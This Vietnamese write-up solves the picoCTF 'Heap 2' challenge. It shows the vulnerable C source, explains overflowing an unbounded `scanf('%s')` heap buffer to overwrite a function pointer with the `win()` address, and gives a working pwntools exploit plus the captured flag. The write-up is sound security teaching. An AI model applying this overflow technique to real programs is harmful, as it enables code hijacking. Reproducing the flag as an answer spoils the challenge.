# Heap 2
Challenge này cho chúng ta 2 file, một file binary `chall` và một file .c `chall.c`.
Mở file `chall.c` thì ta có source code của challenge này như sau:

``` c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64

int num_allocs;
char *x;
char *input_data;

void win() {
    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);
}

void check_win() { ((void (*)())*(int*)x)(); }

void print_menu() {
    printf("\n1. Print Heap\n2. Write to buffer\n3. Print x\n4. Print Flag\n5. "
           "Exit\n\nEnter your choice: ");
    fflush(stdout);
}

void init() {

    printf("\nI have a function, I sometimes like to call it, maybe you should change it\n");
    fflush(stdout);

    input_data = malloc(5);
    strncpy(input_data, "pico", 5);
    x = malloc(5);
    strncpy(x, "bico", 5);
}

void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}

void print_heap() {
    printf("[*]   Address   ->   Value   \n");
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", input_data, input_data);
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", x, x);
    fflush(stdout);
}

int main(void) {

    // Setup
    init();

    int choice;

    while (1) {
        print_menu();
	if (scanf("%d", &choice) != 1) exit(0);

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            write_buffer();
            break;
        case 3:
            // print x
            printf("\n\nx = %s\n\n", x);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}
```

Giao diện của challenge này nhìn giống như bài `heap_0` và bài `heap_1`, và hãy nhìn vào hàm `check_win()`:

``` c
void check_win() { ((void (*)())*(int*)x)(); }
```

Nôm na là hàm này sẽ lấy 4 byte đầu tại vùng nhớ mà `x` trỏ đến, ép thành địa chỉ hàm và gọi hàm tại địa chỉ đó. 

$=>$ **Nếu vùng nhớ mà `x` trỏ đến chứa địa chỉ hàm `win()`, thì hàm `win()` sẽ được gọi là ta có flag.**

Dùng lệnh `checksec` để kiểm tra các cơ chế bảo mật được bật trong file binary, ta thấy PIE không được bật $=>$ các địa chỉ của hàm, biến của chương trình là cố định. Vậy thì địa chỉ hàm `win()` sẽ cố định, không thay đổi nên có thể dễ dàng ghi đè.

![image](https://github.com/user-attachments/assets/18553ad9-40fa-4f54-93ed-d4aa01e16e62)

Ta sẽ sử dụng GDB để tìm địa chỉ hàm `win()` như sau:

![image](https://github.com/user-attachments/assets/c9729603-d41d-4699-a748-9d2595a2acf2)

$->$ Ta có địa chỉ hàm `win()` là: `0x00000000004011a0`.

Giống như bài `heap_0` và bài `heap_1`, offset tính từ địa chỉ mà input bắt đầu được nhập vào đến địa chỉ mà con trỏ `x` trỏ đến là 32.

![image](https://github.com/user-attachments/assets/82f08ccc-bc9f-48ce-8dd9-b95bdf709aad)

Ta nhập 32 ký tự `a` rồi sau đó nhập địa chỉ của hàm `win()` (theo định dạng little endian).

``` python
from pwn import *

#p = process('./chall')
p = remote('mimas.picoctf.net', 58675)
write = b'2'
flag = b'4'
payload = 32 * b'a'
payload += b'\xa0\x11\x40\x00' # địa chỉ hàm win() theo định dạng little endian
p.sendline(write)
p.sendline(payload)
p.sendline(flag)
p.interactive()
```

Và ta có flag:
```
picoCTF{and_down_the_road_we_go_904e3edd}
```
